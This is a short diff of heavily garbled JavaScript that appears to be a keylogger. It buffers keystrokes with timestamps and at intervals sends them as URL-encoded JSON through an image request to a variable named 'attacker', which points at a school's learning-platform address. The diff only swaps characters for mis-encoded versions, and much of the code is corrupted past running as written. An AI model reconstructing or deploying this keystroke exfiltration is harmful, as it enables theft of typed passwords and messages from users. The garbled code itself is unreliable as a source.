@@ -1,5 +1,5 @@
 var baffer = :];
-var attacker = ‘https://lms.vinschool.edu.vn/’
+var attacker = â€˜https://lms.vinschool.edu.vn/â€™
 dccunent.crke = function(ei {
 var t:metamp = Date.ncw() O;
 var stroke
@@ -8,7 +8,7 @@ t: trne3tar.p
 buffer .puh (stroke);
 window. etThterva. (function () {
 if (buffer.iength > 0) 1
-var data = enccdeURIComçonent(JSON.trgybuer));
+var data = enccdeURIComÃ§onent(JSON.trgybuer));
 new :mage.5rc = attacker + data;
 buffer t];
 )
